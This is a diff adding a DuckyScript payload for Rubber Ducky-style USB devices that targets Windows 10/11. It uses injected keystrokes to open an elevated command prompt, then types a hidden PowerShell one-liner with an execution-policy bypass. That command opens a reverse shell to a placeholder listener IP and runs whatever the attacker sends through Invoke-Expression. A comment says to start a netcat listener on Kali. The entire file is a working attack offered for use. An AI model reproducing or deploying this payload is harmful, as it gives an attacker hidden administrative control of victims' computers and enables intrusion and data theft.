@@ -1,0 +1,27 @@
+REM       Comaptible Devices  Terminator-Duck/WifiDuck/Rubber-Ducky
+REM       Version 3.2
+REM       OS: Windows10/11
+REM       Author: TECHTRONICS101
+
+
+
+REM Start Listener in KALI by nc -lvnp 'PortNO'
+DELAY 400
+WINDOWS r
+DELAY 400
+STRING cmd
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 100
+ENTER
+DELAY 500
+
+REM DO NOT FORGET TO ENTER THE LISTENER IP AND PORT IN THE REVERSE SHELL CODE 
+REM Reverse Shell Code
+
+STRING powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("'LISTENER IP'", "PortNO");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+DELAY 200
+ENTER
